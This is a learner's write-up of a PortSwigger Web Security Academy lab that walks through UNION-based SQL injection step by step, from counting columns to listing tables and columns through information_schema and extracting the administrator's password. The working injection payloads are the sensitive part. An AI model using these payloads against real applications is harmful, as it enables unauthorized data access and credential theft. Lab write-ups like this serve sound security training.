# SQL Injection Attack — Listing the Database Contents on Non-Oracle Databases

## Lab

**PortSwigger Web Security Academy**

**Lab:** SQL injection attack, listing the database contents on non-Oracle databases

## Goal

The goal of this lab was to use SQL injection to discover the structure of the database, find the table that stores users, and retrieve the `administrator` user's password in order to log in.

## 1. Finding the number of columns

First, I used `ORDER BY` to test how many columns the query returns.

After testing, I determined that the query returns **2 columns**.

Next, I needed to use `UNION SELECT` to find out which of these columns was reflected back by the application.

## 2. Finding the reflected column

I used the following payload:

```sql
UNION SELECT NULL, 'hello' --
```

I saw that the value `hello` was displayed in the application's response.

This told me that **the second column was reflected on the page**, and that I could pull data through this column.

## 3. Discovering the tables in the database

My next goal was to find out the table names in the database.

I first tried the following query:

```sql
UNION SELECT group_concat(table_name)
FROM information_schema.tables--
```

But I got an **Internal Server Error**.

I then tried:

```sql
UNION SELECT table_name
FROM information_schema.tables--
```

and got an error again.

After checking, I realized the real problem was a **mismatch in the number of columns** in the `UNION` queries.

The original query returned 2 columns, while my `UNION SELECT` queries were only returning 1 column.

So I adjusted the query to also fill the second column:

```sql
UNION SELECT NULL, table_name
FROM information_schema.tables--
```

This time the query worked, and I was able to see the tables in the database.

Alongside tables like `pg...` and `sql...` created by the database itself, the list also contained tables belonging to the application.

## 4. Finding the users table

By examining the tables, I looked for the one holding user information.

Eventually I found this table:

```text
users_tekfbc
```

Now I needed to find out what columns this table had.

## 5. Discovering the column names

For this, I used `information_schema.columns`:

```sql
UNION SELECT NULL, column_name
FROM information_schema.columns
WHERE table_name = 'users_tekfbc'--
```

I saw the table's columns in the response.

The two columns that mattered to us were:

```text
username_pgkcpo
password_cfwljg
```

This is how I found out which columns held the usernames and passwords.

## 6. Extracting the administrator's password

In the final step, I wanted to retrieve only the password belonging to the `administrator` user.

The payload I used:

```sql
UNION SELECT NULL, password_cfwljg
FROM users_tekfbc
WHERE username_pgkcpo = 'administrator'--
```

The `administrator` user's password was displayed in the response.

With this information I logged in through the login page, and the **lab was completed successfully.**

## Attack chain

In summary, the method I used was as follows:

```text
ORDER BY
    ↓
Determine the number of columns
    ↓
UNION SELECT NULL, 'hello'
    ↓
Identify the reflected column
    ↓
information_schema.tables
    ↓
Find the users_tekfbc table
    ↓
information_schema.columns
    ↓
username_pgkcpo + password_cfwljg
    ↓
Filter for the administrator user
    ↓
Obtain the password
    ↓
Login
```

## What I learned

In this lab, I specifically reinforced the following points:

* Using `ORDER BY` to determine the number of columns
* The need for matching column counts when using `UNION SELECT`
* Identifying which column the application reflects in its response
* Discovering table names using `information_schema.tables`
* Discovering table columns using `information_schema.columns`
* Pulling data for a specific user with a `WHERE` condition
* That SQL injection doesn't just allow querying data — it can also allow step-by-step discovery of the database's structure

## AI Usage

**AI was not used in solving this lab.**

I carried out the entire discovery and payload-creation process myself.
